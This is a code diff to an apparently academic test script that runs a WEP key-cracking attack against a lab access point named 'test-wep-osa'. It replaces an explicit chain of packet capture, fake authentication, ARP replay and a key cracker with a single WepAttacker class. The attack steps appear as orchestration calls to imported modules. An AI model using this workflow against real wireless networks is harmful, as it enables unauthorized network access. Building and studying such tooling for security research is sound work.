@@ -10,7 +10,6 @@ Martin Vondracek
 
 import sys
 
-from model import *
 from wep import *
 
 __author__ = 'Martin Vondracek'
@@ -22,7 +21,6 @@ def main():
 
     with tempfile.TemporaryDirectory(prefix='test-wep-osa-') as tmp_dirname:
         if_mon = 'wlp0s20u1u1mon'
-        if_mon_mac = '00:36:76:54:b2:95'
         scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=if_mon)
         scan = scanner.scan_once()
 
@@ -30,35 +28,14 @@ def main():
             if ap.essid == 'test-wep-osa':
                 logging.info('scan found test-wep-osa')
 
-                capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=if_mon)
-                capturer.start(ap)
+                dir_network_path = os.path.join(os.getcwd(), 'networks', ap.essid)
+                os.makedirs(dir_network_path, exist_ok=True)
 
-                fake_authentication = FakeAuthentication(interface=if_mon, ap=ap, attacker_mac=if_mon_mac)
-                fake_authentication.start()
-
-                arp_replay = ArpReplay(interface=if_mon, ap=ap, attacker_mac=if_mon_mac)
-                arp_replay.start()
-
-                # some time to create capturecapturer.capturing_cap_path
-                while not capturer.has_capture_csv():
-                    logging.debug('WirelessCapturer polling result')
-                    time.sleep(1)
-
-                cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=ap)
-                cracker.start()
-
-                iv = capturer.get_iv_sum()
-
-                while not cracker.has_key():
-                    time.sleep(5)
-                    iv_curr = capturer.get_iv_sum()
-                    if iv != iv_curr:
-                        iv = iv_curr
-                        logging.info('#IV = ' + str(iv))
-
-                capturer.stop()
-                arp_replay.stop()
-                fake_authentication.stop()
+                wep_attacker = WepAttacker(
+                    dir_network_path=dir_network_path,
+                    ap=ap,
+                    if_mon=if_mon)
+                wep_attacker.start()
 
     return 0
 
